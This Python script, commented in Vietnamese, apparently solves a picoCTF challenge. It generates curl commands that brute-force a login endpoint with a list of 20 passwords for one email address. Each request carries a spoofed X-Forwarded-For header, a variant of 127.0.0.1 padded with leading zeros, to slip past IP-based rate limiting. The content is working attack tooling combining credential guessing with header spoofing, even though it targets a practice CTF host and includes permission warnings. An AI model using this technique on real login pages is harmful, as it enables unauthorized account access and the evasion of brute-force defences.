#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sinh lệnh curl (KHÔNG gửi). Dùng để kiểm tra local hoặc để copy chạy khi bạn có quyền.
"""
import textwrap

# Thay host vào nếu bạn có quyền thử nghiệm trên host đó; để an toàn mặc định là localhost
HOST = "amiable-citadel.picoctf.net:63070"   # <-- đổi nếu cần và bạn có quyền
ORIGIN = f"http://{HOST}"
ENDPOINT = "/login"

passwords = [
"GD3sx5Iw","ImpUIm8A","PTB1lPnt","cZQk5dKb","ScE1RSSg","6ANZhGC3","fOs08aPG","BUJ8xCeJ",
"6eB8FaoN","oNbpNg5z","m71fz6t1","lvtkWGgm","lpYlqvmj","GanofYft","G9Wym7Uh","gMtYtScr",
"yH6hasWP","EphhZ8nE","Plgh3qpz","GC6nTzOn"
]

email = "ctf-player@picoctf.org"

# Số biến thể "0" bạn muốn thêm trước '1' trong octet cuối
max_leading_zeros = 12  # điều chỉnh nếu cần

def make_xff_variants(base="127.0.0.1", max_zeros=10):
    # tách phần trước và phần cuối '1'
    prefix, last = base.rsplit('.', 1)
    variants = []
    for z in range(0, max_zeros+1):
        # thêm z số '0' trước last (ví dụ z=0 -> '1'; z=1 -> '01'; ...)
        last_variant = ("0"*z) + last
        variants.append(f"{prefix}.{last_variant}")
    return variants

def make_curl_command(host, endpoint, xff, email, password):
    data = '{"email":"%s","password":"%s"}' % (email, password)
    cmd = textwrap.dedent(f"""\
    curl -s -X POST "http://{host}{endpoint}" \\
      -H "Content-Type: application/json" \\
      -H "Origin: {ORIGIN}" \\
      -H "Referer: {ORIGIN}/" \\
      -H "User-Agent: Mozilla/5.0" \\
      -H "X-Forwarded-For: {xff}" \\
      -d '{data}'
    """)
    return cmd

def main():
    variants = make_xff_variants("127.0.0.1", max_leading_zeros)
    print("# GENERATED CURL COMMANDS (DO NOT RUN AGAINST TARGETS YOU DON'T OWN)")
    i = 0
    for p in passwords:
        # vòng lặp qua variants; bạn có thể thay đổi logic pairing
        xff = variants[i % len(variants)]
        cmd = make_curl_command(HOST, ENDPOINT, xff, email, p)
        print(f"# attempt {i+1}  xff={xff}  password={p}")
        print(cmd)
        i += 1

if __name__ == "__main__":
    main()
